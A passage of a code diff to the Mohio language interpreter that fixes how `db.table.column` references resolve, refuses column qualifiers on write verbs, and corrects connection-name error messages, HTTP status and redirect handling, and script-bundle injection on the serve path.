                     f"`X random from {name}` to pick one at random, or connect a real "
                     f"database and run `{verb} ... in db.<table>` against it.")
 
+    # ── Three-level sources: `db.table.column` MEANS the column of that table ────────────
+    #
+    # T1-DOTTED-SOURCE-COLUMN (2026-08-25). C2 stopped `db.users.email` addressing the wrong
+    # TABLE. This is the other half: the column the coder wrote must now MEAN something, or the
+    # verb must say it cannot use it. Silently dropping a word the coder wrote is the same
+    # disease as silently using the wrong one -- quieter, but the program still does something
+    # other than what it says.
+    #
+    # The split is per verb and follows what the verb can actually do:
+    #
+    #   READ verbs   (find / retrieve / grab / get / pull / check count / check exists)
+    #                a column NARROWS the read to that column. Meaningful, so it is honoured.
+    #
+    #   WRITE verbs  (save / update / remove / upsert / save all / remove all / modify)
+    #                a column on the SOURCE is refused. These verbs name the fields they touch
+    #                in their own body, so a column on the source either contradicts the body or
+    #                duplicates it -- there is no reading of `save to db.users.email` that is
+    #                both sensible and unambiguous. Refusing is the honest answer.
+
+    def _resolve_write_target(self, source, ctx, verb):
+        """The table a WRITE verb targets. A column on the source is refused, never dropped."""
+        table, column = self._resolve_source_parts(source, ctx)
+        if column:
+            raise MohioRuntimeError(
+                f"{verb}: `{table}.{column}` names a column, and {verb} works on a whole row. "
+                f"The fields it changes are the ones written in its own body, so a column on the "
+                f"source has nothing to do -- and quietly ignoring it would leave you reading a "
+                f"line that says something the program is not doing. Write `db.{table}` and name "
+                f"`{column}` as a field inside the block.")
+        return table
+
+    def _narrow_result_to_column(self, result, column):
+        """Narrow a bound retrieve result to one column, whatever shape it came back in.
+
+        A retrieve can bind a single record, a list of records, or a count, depending on its
+        modifier. Narrowing at the single exit keeps all of them consistent -- a count is left
+        alone, because narrowing a number to a column is meaningless rather than wrong.
+        """
+        if not column or not isinstance(result, MohioValue):
+            return result
+        raw = result.to_python()
+        if isinstance(raw, dict):
+            return MohioValue(raw.get(column))
+        if isinstance(raw, list):
+            return MohioValue(self._project_column(raw, column), 'list')
+        return result
+
+    @staticmethod
+    def _project_column(rows, column):
+        """Narrow fetched rows to one column. Rows lacking it are left out rather than yielding
+        a null: a column read should hand back the values that exist, not a row of blanks."""
+        if not column:
+            return rows
+        out = []
+        for row in (rows or []):
+            if isinstance(row, dict):
+                if column in row:
+                    out.append(row[column])
+            else:
+                out.append(row)
+        return out
+
+    @staticmethod
+    def _rows_with_column(rows, column):
+        """The rows whose `column` actually holds a value -- what "count the emails in users"
+        means, as distinct from counting the rows."""
+        if not column:
+            return list(rows or [])
+        return [r for r in (rows or [])
+                if isinstance(r, dict) and r.get(column) not in (None, '')]
+
+    # Qualifiers that name a CONNECTION rather than a table. `db.users` is the users table on
+    # the `db` connection; the qualifier is not part of the table name.
+    _SOURCE_QUALIFIERS = ('db',)
+
+    @staticmethod
+    def _split_table_ref(raw):
+        """(table, column) from a dotted source reference, at ANY depth.
+
+        THE RULE, and why it is not "the last segment":
+
+            users              -> ('users', None)
+            db.users           -> ('users', None)
+            db.users.email     -> ('users', 'email')      <- the table is the MIDDLE
+            db.a.b.c           -> ('a', 'b.c')
+
+        Strip a leading connection qualifier, then the TABLE is the FIRST remaining segment and
+        anything after it is a column or sub-selector. Taking the LAST segment is what caused
+        `db.users.email` to address the `email` table -- confirmed live against a database
+        holding both `users` (2 rows) and `email` (1 row): the count came back 1, silently, with
+        no error at all. Every branch of _resolve_source now goes through this one function, so
+        the three spellings of the same reference cannot disagree again.
+
+        Returns (None, None) when nothing resolvable is left; the caller fails loud on that.
+        """
+        text = str(raw if raw is not None else '').strip()
+        marker = '__USERVAR__'
+        if text.startswith(marker):
+            text = text[len(marker):]
+        segs = [s for s in text.split('.') if s]
+        if segs and segs[0] in MohioInterpreter._SOURCE_QUALIFIERS:
+            segs = segs[1:]
+        if not segs:
+            return None, None
+        return segs[0], ('.'.join(segs[1:]) or None)
+
     def _resolve_source(self, source, ctx):
-        if isinstance(source, DbRef):        table = source.table
-        elif isinstance(source, DottedName): table = source.parts[-1] if source.parts else None
+        """The TABLE a source names. See _split_table_ref for the rule and the bug it closes.
+
+        COLUMN INFORMATION IS DISCARDED HERE, deliberately and visibly: this method returns a
+        table, every one of its 17 call sites assigns it to `table`, and no caller has ever
+        received a column. Before this fix a three-level source did not "carry" the column
+        either -- it silently used the column AS the table, which is the bug. If a verb ever
+        needs column semantics for `db.table.column`, it must take them from
+        `_resolve_source_parts` rather than from a table string that never had room for them.
+        """
+        table, _column = self._resolve_source_parts(source, ctx)
+        return table
+
+    def _resolve_source_parts(self, source, ctx):
+        """(table, column) for a source, with the same fail-loud as _resolve_source.
+
+        Exposed separately so a future verb that genuinely means "this column of this table" has
+        somewhere correct to read it from, instead of re-deriving it from a string and getting
+        the same answer wrong in a new place.
+        """
+        column = None
+        if isinstance(source, DbRef):
+            # DbRef.table is built as `str(token).replace('db.', '')`, so for `db.users.email` it
+            # holds `users.email` -- the qualifier stripped but the column still attached. Split
+            # it here rather than trusting it whole.
+            table, column = self._split_table_ref(source.table)
+        elif isinstance(source, DottedName):
+            table, column = self._split_table_ref('.'.join(str(p) for p in (source.parts or [])))
         elif isinstance(source, str):
-            s = source.strip()               # strip "db." prefix if present -- table name only
-            table = s[3:] if s.startswith('db.') else s
+            table, column = self._split_table_ref(source)
         elif source:
-            table = str(source)
+            table, column = self._split_table_ref(str(source))
         else:
             table = None
         # An empty resolution means the table name was lost between parse and execution. The old
@@ -15938,7 +20501,7 @@ class MohioInterpreter:
                 "could not resolve the table for this operation -- the source name was lost "
                 "between parse and execution. Refusing to write to an invented table. "
                 "This is a compiler bug; please report the operation that triggered it.")
-        return table
+        return table, column
 
     def _db_or_fail(self, ctx, verb, node):
         """The ONE door for "this verb needs a database".
@@ -15973,6 +20536,28 @@ class MohioInterpreter:
         handlers = getattr(node, 'handlers', None) or []
         if any(isinstance(h, OnFailure) for h in handlers):
             return None, self._handle_failure(handlers, ctx, "no database connection")
+        # THE MESSAGE USED TO LIE. Every query call site resolves the hardcoded default name
+        # `'db'`, so `connect primary as sqlite ...` opened a real connection and a `find`
+        # against it still said "none is open" -- the one thing the developer could see was
+        # false, and it sent them looking for a missing `connect` line that was right there.
+        # The registry stores by name and `get_connection` takes a name; only the call sites
+        # pass the default. That is MVP wiring left unfinished, never a decision, so the
+        # message must not codify it as the design either: it does NOT say connections must be
+        # called `db`.
+        _open = sorted(n for n in ctx.open_connection_names() if n)
+        if _open:
+            _named = ", ".join(f"`{n}`" for n in _open)
+            raise _Raise(
+                error_name='connection_name_not_resolved',
+                message=(f"`{verb}` could not reach a database connection. {_named} "
+                         f"{'is' if len(_open) == 1 else 'are'} open, but the query layer does "
+                         f"not resolve a connection name other than the default yet."),
+                line=getattr(node, 'line', None),
+                hint="Today, name the connection you query `db` "
+                     "(`connect db as sqlite from env.DATABASE_URL`) and refer to it as "
+                     "`db.<table>`. Naming connections and querying them by name is a real "
+                     "declared form that is not wired through the query layer yet -- this is "
+                     "not a rule that connections must be called `db`.")
         raise _Raise(
             error_name='no_db_connection',
             message=f"`{verb}` needs a database connection, but none is open.",
@@ -16097,9 +20682,32 @@ class MohioInterpreter:
         return resp
 
     def run_with_session(self, program, request, session_id, store):
+        """Session-aware run. Releases the thread's pooled DB lease on every exit."""
+        self._index_sagas(program)
+        try:
+            return self._run_with_session_inner(program, request, session_id, store)
+        finally:
+            self.release_db_connections()
+            # The SESSION STORE leases too (1b), and it is not reachable from
+            # release_db_connections -- it is passed in, not held on the interpreter.
+            _rel = getattr(store, 'release_thread_connection', None)
+            if _rel is not None:
+                try:
+                    _rel()
+                except Exception:
+                    pass
+
+    def _run_with_session_inner(self, program, request, session_id, store):
         self._ai_call_count = 0   # reset per request
         self._saga_failed = False  # reset saga-failure flag per request
         self.shown = []           # reset show output per request (no cross-request leak)
+        # ONE id per request, minted here because this is the single seam every served request
+        # passes through. It EXTENDS the trace id that already existed rather than adding a
+        # second scheme: `format_runtime_error` minted a fresh `_mohio_trace_id()` per ERROR,
+        # so an error could be correlated with itself and with nothing else -- not with the
+        # audit row written moments earlier in the same request, and not with the log line.
+        # Now the error, the audit row and the log line all carry this one value.
+        self._request_id = _mohio_trace_id()
         import time as _time
         self._run_deadline = (_time.monotonic() + self._run_seconds_limit) if self._run_seconds_limit > 0 else None
         """
@@ -16130,6 +20738,10 @@ class MohioInterpreter:
                 self._exec_declarations(program, base_ctx)
                 self._register_ai_blocks(program)
                 self._base_ctx = base_ctx
+            # Outside the base-context guard on purpose: the bundle is keyed by program
+            # identity, so it must be (re)built when the PROGRAM changes, not only on the
+            # first request that builds the base context.
+            self._ensure_mioscript(program)
             base_ctx = self._base_ctx
 
             idle_ceiling, absolute_ceiling = self._session_timeout_ceilings(base_ctx)
@@ -16276,7 +20888,12 @@ class MohioInterpreter:
                 # the browser so the NEXT request (after a real login) can find it again.
                 if e.error_name == "authorization_error":
                     return _attach_cookies({"status": 403, "body": str(e.message)})
-                return _attach_cookies({"status": 500, "body": str(e)})
+                # Same fix as the plain run() path for the identical bug: this was hardcoded
+                # to 500 for every OTHER error_name, flattening every other
+                # _RUNTIME_STATUS_TABLE entry (not_found -> 404, validation_error -> 400, ...)
+                # to a wrong 500 on the REAL mio-serve path. Body format (str(e)) unchanged.
+                return _attach_cookies(
+                    {"status": _RUNTIME_STATUS_TABLE.get(e.error_name, 500), "body": str(e)})
             if isinstance(e, _Jump):
                 # Same session-cookie reasoning as the two branches above -- a redirect
                 # (the shape a real login-then-redirect flow would use) must not silently
@@ -16284,7 +20901,14 @@ class MohioInterpreter:
                 # branch's missing `redirect_to` key and its 302 (vs. the plain run()
                 # path's 303) are a separate, pre-existing inconsistency, out of scope for
                 # this unit -- named, not fixed.
-                return _attach_cookies({"status": 302, "body": str(e.destination)})
+                # T1-SERVE-PATH-DIVERGENCE (2026-08-31): this returned 302 with the
+                # destination in the BODY and no `redirect_to` key, so mohio_server never
+                # emitted a Location header -- the URL leaked into the JSON and a browser had
+                # nothing to navigate to. run() already did this correctly; the serve path,
+                # which is the ONLY path a browser ever takes, did not. 303 See Other matches
+                # run() and is the correct status for post-redirect-get.
+                return _attach_cookies({"status": 303, "body": "",
+                                        "redirect_to": str(e.destination)})
             # A MohioRuntimeError (e.g. re-holding an already-held value, a failed contract) is a
             # real, deliberate fail-loud from the program. It should surface as a clean 500 response
             # for this request -- not crash the server or take down the session -- mirroring how the
@@ -16292,6 +20916,30 @@ class MohioInterpreter:
             if isinstance(e, MohioRuntimeError):
                 return _attach_cookies({"status": 500, "body": str(e)})
             raise
+
+    def _ensure_mioscript(self, program):
+        """Compile this program's browser-event listeners into the JS bundle, once.
+
+        T1-SERVE-PATH-DIVERGENCE (2026-08-31). This step used to live INLINE in `_run_inner`,
+        which only the CLI `run()` path reaches. `mio serve` dispatches every HTTP request
+        through `run_with_session`, which never ran it -- so `self._mioscript_js` was never
+        set, the shared `_inject_mioscript` silently no-opped, and ZERO <script> tags reached
+        the browser. Verified over real HTTP against examples/contact.mho: `script tags: 0` on
+        a page that renders a form. A pioneer following the mioscript guide served a page with
+        no behaviour at all, and `mio check` was clean.
+
+        Hoisted rather than copied into the second path: duplicating it is exactly how the two
+        paths diverged in the first place. One source, both callers.
+        """
+        if getattr(self, '_mioscript_for', None) == id(program):
+            return
+        _client_listeners = self._collect_client_listeners(program)
+        if _client_listeners:
+            from mohio_mioscript import compile_listeners
+            self._mioscript_js = compile_listeners(_client_listeners)
+        else:
+            self._mioscript_js = ""
+        self._mioscript_for = id(program)
 
     def _register_ai_blocks(self, program):
         """Store every ai.decide block by name so a bare `ai.decide <name>`
@@ -16359,9 +21007,9 @@ class MohioInterpreter:
         blocks, journeys, and bare pages. A no-route (404) from one listener does not
         shadow a match from a sibling (continue-on-404). If a path was given and
         nothing matched, return one clean 404 rather than a silent None."""
-        from mohio_ast import ListenBlock, JourneyDecl, PageDecl
-        listener_types = (ListenBlock, JourneyDecl, PageDecl)
-        req = getattr(ctx, '_current_request', None)
+        from mohio_ast import ListenBlock, JourneyDecl
+        listener_types = (ListenBlock, JourneyDecl)
+        req = scoped_attr(ctx, '_current_request')
         has_listeners = any(isinstance(s, listener_types) for s in program.statements)
         final_404 = None
         for stmt in program.statements:
